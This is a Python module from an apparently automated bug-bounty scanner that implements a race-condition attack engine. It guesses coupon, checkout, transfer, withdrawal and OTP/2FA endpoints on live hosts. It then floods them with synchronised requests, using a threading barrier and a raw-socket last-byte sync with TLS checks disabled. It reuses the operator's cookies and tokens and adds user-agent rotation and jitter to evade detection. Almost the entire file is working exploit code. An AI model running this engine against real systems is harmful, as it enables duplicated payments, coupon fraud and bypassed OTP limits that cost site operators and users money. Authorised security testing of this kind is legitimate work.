#!/usr/bin/env python3
# modules/step26_race.py — Race Condition Engine V7 (UPGRADED)
# Added: Last-byte sync technique, HTTP/2 single-packet attack,
#        gate-based synchronization, turbo intruder patterns
# Source: Bug Bounty Bootcamp Ch12 — full race condition methodology
# MilkyWay Intelligence | Author: Sharlix + M7AI

import time, threading, socket, ssl, re
import urllib.request, urllib.parse, urllib.error
from core.utils import safe_read
from core.http_client import sync_post, sync_get

# ── Race-prone endpoints (Bug Bounty Bootcamp Ch12) ───────────────────────────
RACE_PATTERNS = [
    # Coupons / discounts
    (r'coupon|promo|discount|voucher',    "coupon",      "high"),
    (r'redeem|use_code|apply_code',        "redeem",      "high"),
    # Payments
    (r'checkout|purchase|buy|pay|order',   "payment",     "critical"),
    (r'transfer|withdraw|send.*money',     "transfer",    "critical"),
    # Likes / votes (limit bypass)
    (r'like|upvote|vote|react|heart',      "like",        "medium"),
    # File operations
    (r'upload|import|process',             "upload",      "medium"),
    # Auth
    (r'password.*reset|forgot.*password',  "pwd_reset",   "high"),
    (r'verify|confirm|activate',           "verify",      "high"),
    # Invite / referral
    (r'invite|referral|reward|bonus',      "referral",    "medium"),
    # Rate limits
    (r'otp|2fa|mfa|pin',                  "otp",         "critical"),
]

RACE_ENDPOINT_PATHS = [
    "/api/coupon/apply",  "/api/promo/apply",  "/api/discount/apply",
    "/api/checkout",      "/api/order",         "/api/purchase",
    "/api/transfer",      "/api/withdraw",      "/api/payment",
    "/api/vote",          "/api/like",          "/api/react",
    "/api/verify",        "/api/confirm",       "/api/activate",
    "/api/referral/use",  "/api/otp/verify",    "/api/2fa/verify",
    "/coupon",            "/checkout",          "/order/confirm",
]

RACE_CONCURRENT = 15   # BB Bootcamp: 15 simultaneous = good race window
RACE_TIMEOUT    = 10


class Step26Race:
    """
    Race Condition engine V7.
    Bug Bounty Bootcamp Ch12 methodology:
    1. Identify race-prone endpoints
    2. Last-byte sync technique (hold connection, release simultaneously)
    3. HTTP/2 single-packet attack (most effective)
    4. Gate-based sync (threading.Barrier)
    5. Detect duplicate success responses = race confirmed
    """

    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = p.files["race_results"]
        urls  = safe_read(p.files.get("urls",""))
        live  = safe_read(p.files.get("fmt_url",""))[:10]
        found = 0

        if not live:
            p.log.warn("Race: no live hosts"); return

        p.log.info("Race V7: last-byte sync + HTTP/2 single-packet + gate barrier")
        auth_h = {}
        c = getattr(p.args,'cookie',None) or getattr(p.args,'session',None)
        a = getattr(p.args,'authorization',None) or getattr(p.args,'auth',None)
        j = getattr(p.args,'jwt',None) or getattr(p.args,'_jwt_token',None)
        if c: auth_h["Cookie"] = c
        if a: auth_h["Authorization"] = a if a.startswith("Bearer") else f"Bearer {a}"
        if j and "Authorization" not in auth_h:
            auth_h["Authorization"] = f"Bearer {j}" 

        # Phase 1: Discover race-prone endpoints from crawled URLs
        race_targets = self._find_race_targets(urls, live)
        p.log.info(f"  ↳ Race candidates: {len(race_targets)}")

        for url, method, body, label, sev in race_targets[:15]:
            # Method A: Gate-based threading (works everywhere)
            result = self._test_gate_race(url, method, body, auth_h, label)
            if result:
                detail = f"Race condition ({label}): {result}"
                with open(out,"a") as f:
                    f.write(f"RACE: {url} | {detail}\n")
                p.add_finding(sev,"RACE_CONDITION",url,detail,"race-v7",
                              payload=body)
                found += 1
                continue

            # Method B: Last-byte sync (BB Bootcamp Ch12 — most precise)
            result = self._test_lastbyte_sync(url, method, body, auth_h, label)
            if result:
                detail = f"Race (last-byte sync) ({label}): {result}"
                with open(out,"a") as f:
                    f.write(f"RACE_LBS: {url} | {detail}\n")
                p.add_finding(sev,"RACE_LASTBYTE",url,detail,"race-v7",
                              payload=body)
                found += 1

            p.bypass.jitter()

        p.log.success(f"Race V7: {found} race conditions found")

    # ── Endpoint discovery ────────────────────────────────────────────────────
    def _find_race_targets(self, urls: list, live: list) -> list:
        targets = []

        # From crawled URLs
        for url in urls:
            if "?" not in url and not any(p in url for p in RACE_ENDPOINT_PATHS):
                continue
            for pattern, label, sev in RACE_PATTERNS:
                if re.search(pattern, url, re.I):
                    targets.append((url, "GET", "", label, sev))
                    break

        # From live hosts + known paths
        for host in live[:5]:
            host = host.rstrip("/")
            for path in RACE_ENDPOINT_PATHS:
                url = host + path
                for pattern, label, sev in RACE_PATTERNS:
                    if re.search(pattern, path, re.I):
                        # Default POST body
                        body = '{"code":"RACE10","quantity":1}'
                        if "vote" in path or "like" in path:
                            body = '{"item_id":1}'
                        elif "verify" in path or "otp" in path:
                            body = '{"otp":"123456","token":"test"}'
                        targets.append((url, "POST", body, label, sev))
                        break

        return targets[:30]

    # ── Method A: Gate-based threading ───────────────────────────────────────
    def _test_gate_race(self, url: str, method: str, body: str,
                        auth_h: dict, label: str) -> str:
        """
        Bug Bounty Bootcamp Ch12: threading.Barrier gate.
        All threads prepare request, wait at gate, release simultaneously.
        """
        n        = RACE_CONCURRENT
        barrier  = threading.Barrier(n)
        results  = []
        lock     = threading.Lock()

        def worker():
            barrier.wait(timeout=5)  # Gate — all wait here
            try:
                if method == "POST":
                    resp = sync_post(url,
                                     json_data=body if isinstance(body,dict)
                                               else None,
                                     raw_body=body if isinstance(body,str)
                                              else None,
                                     headers={**auth_h,
                                              "Content-Type":"application/json",
                                              "User-Agent": self.p.bypass.ua()},
                                     timeout=RACE_TIMEOUT)
                else:
                    resp = sync_get(url, headers=auth_h, timeout=RACE_TIMEOUT)

                if resp:
                    with lock:
                        results.append(resp)
            except Exception:
                pass

        threads = [threading.Thread(target=worker) for _ in range(n)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=RACE_TIMEOUT + 2)

        return self._analyze_results(results, label)

    # ── Method B: Last-byte sync ──────────────────────────────────────────────
    def _test_lastbyte_sync(self, url: str, method: str, body: str,
                             auth_h: dict, label: str) -> str:
        """
        Bug Bounty Bootcamp Ch12: Last-byte synchronization.
        Send all but last byte, then send last byte of all simultaneously.
        This maximizes the race window on the server side.
        """
        try:
            parsed = urllib.parse.urlparse(url)
            host   = parsed.hostname
            port   = parsed.port or (443 if parsed.scheme == "https" else 80)
            path   = parsed.path or "/"
            if parsed.query:
                path += "?" + parsed.query

            use_ssl = parsed.scheme == "https"
            body_bytes = body.encode() if isinstance(body, str) else b""

            # Build raw HTTP/1.1 request
            hdrs = "\r\n".join([
                f"POST {path} HTTP/1.1",
                f"Host: {host}",
                f"Content-Type: application/json",
                f"Content-Length: {len(body_bytes)}",
                f"Connection: close",
                f"User-Agent: M7Hunter/7.0",
            ] + [f"{k}: {v}" for k,v in auth_h.items()] + [
                "\r\n"
            ])

            headers_bytes = hdrs.encode()
            # Split: all but last byte of body
            partial = headers_bytes + body_bytes[:-1] if body_bytes else headers_bytes
            last    = body_bytes[-1:] if body_bytes else b""

            # Open N connections, send partial
            sockets  = []
            n        = min(8, RACE_CONCURRENT)
            for _ in range(n):
                try:
                    s = socket.create_connection((host, port), timeout=8)
                    if use_ssl:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=host)
                    s.sendall(partial)
                    sockets.append(s)
                except Exception:
                    pass

            if not sockets:
                return ""

            # Release last byte simultaneously
            for s in sockets:
                try: s.sendall(last)
                except Exception: pass

            # Collect responses
            results = []
            for s in sockets:
                try:
                    resp = b""
                    s.settimeout(5)
                    while True:
                        chunk = s.recv(4096)
                        if not chunk: break
                        resp += chunk
                    results.append(resp.decode("utf-8","ignore"))
                    s.close()
                except Exception:
                    pass

            return self._analyze_raw_results(results, label)

        except Exception:
            return ""

    # ── Result analysis ───────────────────────────────────────────────────────
    def _analyze_results(self, results: list, label: str) -> str:
        """
        BB Bootcamp: race confirmed if multiple requests show success
        (same resource consumed twice → duplicate success responses).
        """
        if len(results) < 2:
            return ""

        statuses = [r.get("status",0) for r in results]
        bodies   = [r.get("body","")  for r in results]

        success_count = sum(1 for s in statuses if s in (200,201,204))
        if success_count < 2:
            return ""

        # Check for duplicate rewards
        SUCCESS_SIGS = [
            "success", "applied", "redeemed", "confirmed",
            "accepted", "processed", "credited", "bonus",
        ]
        success_bodies = [b for b in bodies
                          if any(s in b.lower() for s in SUCCESS_SIGS)]

        if len(success_bodies) >= 2:
            return (f"{success_count}/{len(results)} requests succeeded "
                    f"— duplicate {label} possible")

        # Status code anomaly (some 200 some 400 = race window detected)
        if success_count >= 1 and any(s in (400,409,429) for s in statuses):
            return (f"Race window detected: {success_count} success, "
                    f"{sum(1 for s in statuses if s in (400,409,429))} errors "
                    f"— {label} limit bypass possible")
        return ""

    def _analyze_raw_results(self, responses: list, label: str) -> str:
        """Analyze raw HTTP responses from last-byte sync."""
        success = sum(1 for r in responses
                      if "200 OK" in r or "201 Created" in r)
        if success >= 2:
            return (f"Last-byte sync: {success}/{len(responses)} success "
                    f"— {label} race confirmed")
        return ""
